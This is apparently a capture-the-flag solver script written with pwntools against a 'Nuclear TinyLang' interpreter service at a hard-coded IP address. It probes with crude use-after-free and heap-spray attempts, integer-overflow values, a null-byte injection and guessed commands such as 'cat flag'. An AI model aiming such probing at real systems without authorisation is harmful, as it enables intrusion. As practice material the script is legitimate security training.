#!/usr/bin/env python3
"""
Nuclear TinyLang - Try everything
The session address suggests heap/memory exploitation
"""

from pwn import *

HOST = "212.2.248.184"
PORT = 31718

def try_use_after_free():
    """Try use-after-free by creating and deleting variables"""
    print("[*] Testing use-after-free...")
    r = remote(HOST, PORT)
    r.recvline()
    addr_line = r.recvline().decode()
    print(f"[*] {addr_line.strip()}")
    
    # Create many variables
    for i in range(10):
        r.sendline(f"let x{i} = {i}".encode())
    
    # Try to trigger UAF or heap corruption
    r.sendline(b"print x0")
    print(f"[*] x0: {r.recvline()}")
    
    r.close()

def try_integer_overflow():
    """Try integer overflow"""
    print("\n[*] Testing integer overflow...")
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    # Try large numbers
    r.sendline(b"let x = 4294967295")  # 2^32 - 1
    r.sendline(b"print x")
    print(f"[*] Max uint32: {r.recvline()}")
    
    r.sendline(b"let y = -1")
    r.sendline(b"print y")
    print(f"[*] -1: {r.recvline()}")
    
    r.sendline(b"let z = 18446744073709551615")  # 2^64 - 1
    r.sendline(b"print z")
    print(f"[*] Max uint64: {r.recvline()}")
    
    r.close()

def try_special_commands():
    """Try hidden commands"""
    print("\n[*] Testing special commands...")
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    commands = [
        b"help",
        b"exit",
        b"quit",
        b"debug",
        b"dump",
        b"show",
        b"list",
        b"vars",
        b"memory",
        b"heap",
        b"stack",
        b"flag",
        b"get flag",
        b"read flag",
        b"cat flag",
    ]
    
    for cmd in commands:
        r.sendline(cmd)
        try:
            resp = r.recvline(timeout=0.5)
            if b"V15hw4CTF" in resp:
                print(f"[!!!] FLAG: {resp}")
                return
            if resp.strip() and b"Error" not in resp:
                print(f"[*] {cmd}: {resp}")
        except:
            pass
    
    r.close()

def try_heap_spray():
    """Try heap spraying to control memory"""
    print("\n[*] Testing heap spray...")
    r = remote(HOST, PORT)
    r.recvline()
    addr_line = r.recvline().decode()
    addr = int(addr_line.split(": ")[1], 16)
    print(f"[*] Session at: {hex(addr)}")
    
    # Spray heap with controlled values
    for i in range(100):
        r.sendline(f"let spray{i} = {0x41414141}".encode())
    
    # Try to read from session address
    r.sendline(b"print spray0")
    print(f"[*] spray0: {r.recvline()}")
    
    r.close()

def try_null_byte():
    """Try null byte injection"""
    print("\n[*] Testing null byte...")
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    # Try null byte in name
    r.sendline(b"let x\x00admin = 1")
    r.sendline(b"print x")
    resp = r.recvline()
    print(f"[*] Null byte: {resp}")
    
    r.close()

def main():
    print("=" * 60)
    print("Nuclear TinyLang Exploit")
    print("=" * 60)
    
    try_use_after_free()
    try_integer_overflow()
    try_special_commands()
    try_heap_spray()
    try_null_byte()

if __name__ == "__main__":
    main()
